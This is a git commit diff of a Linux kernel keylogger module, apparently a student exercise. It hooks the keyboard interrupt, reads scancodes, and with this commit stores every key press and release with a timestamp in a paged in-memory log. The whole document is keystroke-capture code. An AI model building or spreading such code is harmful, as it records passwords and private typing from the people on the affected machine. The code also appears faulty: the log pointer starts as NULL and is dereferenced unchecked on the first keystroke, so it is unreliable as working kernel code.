de7cd64ed5f084bd35dfe959e589e99a9adc0797
Chr0nos <snicolet@student.42.fr>
2018-11-01 19:13:16 +0100

    push to test

--- keylog.c
+++ keylog.c
@@ -8,6 +8,7 @@
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <linux/miscdevice.h>
+#include <linux/time.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
@@ -41,19 +42,21 @@ enum e_key_event {
 
 struct key_log_entry {
 	struct key_map		*key;
-	time_t			timestamp;
+	struct tm		timestamp;
 	enum e_key_event	event;
 };
 
 struct key_log_index {
-	void			*prev;
-	void			*next;
+	struct key_log_index	*prev;
+	struct key_log_index	*next;
 	size_t			available;
 	size_t			used;
 	struct key_log_entry	*entries;
 };
 
-static struct key_log_index *key_log_create_page(void *parent)
+static struct key_log_index	*key_full_log;
+
+static struct key_log_index *key_log_create_page(struct key_log_index *next)
 {
 	void		*ptr;
 	size_t		blocks;
@@ -66,12 +69,29 @@ static struct key_log_index *key_log_create_page(void *parent)
 	pr_info("created a new page of %lu logs enties", blocks);
 	memset(ptr, 0, PAGE_SIZE);
 	*((struct key_log_index *)ptr) = (struct key_log_index) {
-		.prev = parent,
-		.next = NULL,
+		.prev = NULL,
+		.next = next,
 		.available = blocks,
 		.used = 0,
 		.entries = (void *)((size_t)ptr + sizeof(struct key_log_index))
 	};
+	if (next)
+		next->prev = ptr;
+	return ptr;
+}
+
+static void		key_log_clean(void)
+{
+	struct key_log_index	*lst;
+	struct key_log_index	*next;
+
+	lst = key_full_log;
+	while (lst) {
+		next = lst->next;
+		memset(lst, 0, PAGE_SIZE);
+		kfree(lst);
+		lst = next;
+	}
 }
 
 static struct key_map key_table[] = {
@@ -178,6 +198,31 @@ static const struct file_operations ops = {
 	.write = write_key
 };
 
+static struct key_log_entry *key_create_entry(struct key_map *key)
+{
+	struct timespec		ts;
+	struct key_log_entry	*log;
+	struct key_log_index	*page;
+
+	// here we need a new page
+	if (key_full_log->available == 0) {
+		page = key_log_create_page(key_full_log);
+		if (!page) {
+			pr_err("failed to create a new page !\n");
+			return NULL;
+		}
+		key_full_log = page;
+	}
+	getnstimeofday(&ts);
+	log = &key_full_log->entries[key_full_log->used];
+	log->key = key;
+	log->event = (key->pressed) ? PRESS : RELEASE;
+	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &log->timestamp);
+	key_full_log->used += 1;
+	key_full_log->available -= 1;
+	return (log);
+}
+
 static irqreturn_t	key_handler(int irq, void *dev_id)
 {
 	const unsigned int	scancode = inb(0x60);
@@ -188,6 +233,7 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 		key->pressed = (scancode & 0x80) == 0;
 		if (key->pressed)
 			key->press_count += 1;
+		key_create_entry(key);
 		pr_info("(scan: %3u) -> %s : %10s [%4lu]\n", scancode,
 			(key ? key->name : "/"),
 			(key->pressed ? "pressed" : "released"),
@@ -210,6 +256,7 @@ static void		__exit keylogger_clean(void)
 	pr_info(MODULE_NAME "Cleaning up module.\n");
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
+	key_log_clean();
 }
 
 static int		__init hello_init(void)
@@ -217,6 +264,7 @@ static int		__init hello_init(void)
 	int		ret;
 
 	pr_info(MODULE_NAME "init ! %lu\n", sizeof(struct key_log_entry));
+	key_full_log = NULL;
 	caps_lock = false;
 	key_caps = get_key(14);
 	key_shift_left = get_key(42);
